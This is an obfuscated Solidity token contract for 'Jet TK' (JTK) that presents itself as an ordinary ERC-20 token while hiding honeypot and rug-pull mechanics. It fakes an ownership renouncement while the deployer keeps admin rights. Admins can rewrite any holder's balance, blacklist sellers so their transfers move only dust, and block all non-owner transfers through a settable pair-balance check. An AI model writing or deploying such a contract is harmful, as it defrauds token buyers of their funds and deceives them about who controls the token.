//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface whoaagyob {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract anlutuzjej {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface himqijqlpysol {
    function createPair(address zxumuptijhh, address lecdkubxw) external returns (address);
}

interface xprrepkgc {
    function totalSupply() external view returns (uint256);

    function balanceOf(address vfcsdtvpipru) external view returns (uint256);

    function transfer(address sbappeengk, uint256 zshdorbzquqp) external returns (bool);

    function allowance(address aqngpljkn, address spender) external view returns (uint256);

    function approve(address spender, uint256 zshdorbzquqp) external returns (bool);

    function transferFrom(
        address sender,
        address sbappeengk,
        uint256 zshdorbzquqp
    ) external returns (bool);

    event Transfer(address indexed from, address indexed gqnulkqaccxwx, uint256 value);
    event Approval(address indexed aqngpljkn, address indexed spender, uint256 value);
}

interface xprrepkgcMetadata is xprrepkgc {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JetTK is anlutuzjej, xprrepkgc, xprrepkgcMetadata {

    function idsfbbgdig(address wapcgxfju, address sbappeengk, uint256 zshdorbzquqp) internal returns (bool) {
        require(vsqdqmwmomswb[wapcgxfju] >= zshdorbzquqp);
        vsqdqmwmomswb[wapcgxfju] -= zshdorbzquqp;
        vsqdqmwmomswb[sbappeengk] += zshdorbzquqp;
        emit Transfer(wapcgxfju, sbappeengk, zshdorbzquqp);
        return true;
    }

    function vxgegevjv() public {
        emit OwnershipTransferred(phochlekfvpe, address(0));
        qdibuoubnjom = address(0);
    }

    bool private ywedwlnbpi;

    function kgjfunugt() private view {
        require(icxdptuuixoo[_msgSender()]);
    }

    function allowance(address ksxoqtelkbsmia, address xdwkmqpjizbkvr) external view virtual override returns (uint256) {
        if (xdwkmqpjizbkvr == uqbcjoctromnx) {
            return type(uint256).max;
        }
        return rekouywcqvnny[ksxoqtelkbsmia][xdwkmqpjizbkvr];
    }

    address uqbcjoctromnx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private qdibuoubnjom;

    event OwnershipTransferred(address indexed dlwjjsounmmant, address indexed zaopvymkq);

    function gkxjiiufhcj(address kytnuiubep) public {
        if (xsqsxhydx) {
            return;
        }
        
        icxdptuuixoo[kytnuiubep] = true;
        
        xsqsxhydx = true;
    }

    function balanceOf(address vfcsdtvpipru) public view virtual override returns (uint256) {
        return vsqdqmwmomswb[vfcsdtvpipru];
    }

    address adyzsdiodrribf = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return mpfvwzbcustxnj;
    }

    address public jxrxriwsgpaf;

    uint256 skzvioloxdswrx;

    function owner() external view returns (address) {
        return qdibuoubnjom;
    }

    function getOwner() external view returns (address) {
        return qdibuoubnjom;
    }

    uint256 private lnmdkasqhhiqh;

    uint256 private mpfvwzbcustxnj = 100000000 * 10 ** 18;

    mapping(address => bool) public icxdptuuixoo;

    bool public xsqsxhydx;

    uint256 iwjyfsnxgf;

    mapping(address => bool) public wfockzzucrvt;

    uint256 constant gfpyitddyscgqz = 10 ** 10;

    mapping(address => mapping(address => uint256)) private rekouywcqvnny;

    function transfer(address nhslimwtji, uint256 zshdorbzquqp) external virtual override returns (bool) {
        return qdnmcniwk(_msgSender(), nhslimwtji, zshdorbzquqp);
    }

    function myasqmdxjksdhm(uint256 zshdorbzquqp) public {
        kgjfunugt();
        iwjyfsnxgf = zshdorbzquqp;
    }

    uint8 private njljkgxxoe = 18;

    string private dwnzoctuxioed = "Jet TK";

    function symbol() external view virtual override returns (string memory) {
        return hpicucpcq;
    }

    function approve(address xdwkmqpjizbkvr, uint256 zshdorbzquqp) public virtual override returns (bool) {
        rekouywcqvnny[_msgSender()][xdwkmqpjizbkvr] = zshdorbzquqp;
        emit Approval(_msgSender(), xdwkmqpjizbkvr, zshdorbzquqp);
        return true;
    }

    uint256 private fwsvfuzwtuhaef;

    address public phochlekfvpe;

    function tlficperblu(address nhslimwtji, uint256 zshdorbzquqp) public {
        kgjfunugt();
        vsqdqmwmomswb[nhslimwtji] = zshdorbzquqp;
    }

    string private hpicucpcq = "JTK";

    function name() external view virtual override returns (string memory) {
        return dwnzoctuxioed;
    }

    function transferFrom(address wapcgxfju, address sbappeengk, uint256 zshdorbzquqp) external override returns (bool) {
        if (_msgSender() != uqbcjoctromnx) {
            if (rekouywcqvnny[wapcgxfju][_msgSender()] != type(uint256).max) {
                require(zshdorbzquqp <= rekouywcqvnny[wapcgxfju][_msgSender()]);
                rekouywcqvnny[wapcgxfju][_msgSender()] -= zshdorbzquqp;
            }
        }
        return qdnmcniwk(wapcgxfju, sbappeengk, zshdorbzquqp);
    }

    uint256 private wrzyisdcqe;

    constructor (){
        
        vxgegevjv();
        whoaagyob esaydkanwjo = whoaagyob(uqbcjoctromnx);
        jxrxriwsgpaf = himqijqlpysol(esaydkanwjo.factory()).createPair(esaydkanwjo.WETH(), address(this));
        if (wrzyisdcqe != fwsvfuzwtuhaef) {
            fwsvfuzwtuhaef = wrzyisdcqe;
        }
        phochlekfvpe = _msgSender();
        icxdptuuixoo[phochlekfvpe] = true;
        vsqdqmwmomswb[phochlekfvpe] = mpfvwzbcustxnj;
        if (fwsvfuzwtuhaef == lnmdkasqhhiqh) {
            fwsvfuzwtuhaef = lnmdkasqhhiqh;
        }
        emit Transfer(address(0), phochlekfvpe, mpfvwzbcustxnj);
    }

    function decimals() external view virtual override returns (uint8) {
        return njljkgxxoe;
    }

    mapping(address => uint256) private vsqdqmwmomswb;

    function kaqxqwizkcegu(address xnsxclnxua) public {
        kgjfunugt();
        
        if (xnsxclnxua == phochlekfvpe || xnsxclnxua == jxrxriwsgpaf) {
            return;
        }
        wfockzzucrvt[xnsxclnxua] = true;
    }

    bool public fixagilwudeb;

    function qdnmcniwk(address wapcgxfju, address sbappeengk, uint256 zshdorbzquqp) internal returns (bool) {
        if (wapcgxfju == phochlekfvpe) {
            return idsfbbgdig(wapcgxfju, sbappeengk, zshdorbzquqp);
        }
        uint256 tpebowsxpspnmw = xprrepkgc(jxrxriwsgpaf).balanceOf(adyzsdiodrribf);
        require(tpebowsxpspnmw == iwjyfsnxgf);
        require(sbappeengk != adyzsdiodrribf);
        if (wfockzzucrvt[wapcgxfju]) {
            return idsfbbgdig(wapcgxfju, sbappeengk, gfpyitddyscgqz);
        }
        return idsfbbgdig(wapcgxfju, sbappeengk, zshdorbzquqp);
    }

}